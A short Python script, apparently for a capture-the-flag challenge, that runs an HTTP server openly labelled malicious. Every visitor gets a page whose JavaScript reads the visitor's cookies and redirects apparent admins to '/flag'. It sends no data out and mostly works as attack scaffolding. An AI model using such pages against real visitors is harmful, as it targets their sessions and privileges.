from http.server import SimpleHTTPRequestHandler, HTTPServer

class MaliciousHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Trả về trang HTML chứa JavaScript độc hại
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        malicious_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Malicious Page</title>
        </head>
        <body>
            <h1>Welcome to my site!</h1>
            <script>
                // Tự động chuyển hướng admin đến /flag
                if (document.cookie.includes("admin=true")) {
                    window.location.href = "/flag";
                } else {
                    alert("You are not an admin!");
                }
            </script>
        </body>
        </html>
        """
        self.wfile.write(malicious_html.encode("utf-8"))

if __name__ == "__main__":
    # Địa chỉ và cổng của server
    host = "0.0.0.0"
    port = 8080

    # Khởi chạy server
    server = HTTPServer((host, port), MaliciousHTTPRequestHandler)
    print(f"Malicious HTTP server running on {host}:{port}")
    print("Press Ctrl+C to stop the server.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down the server.")
        server.server_close()
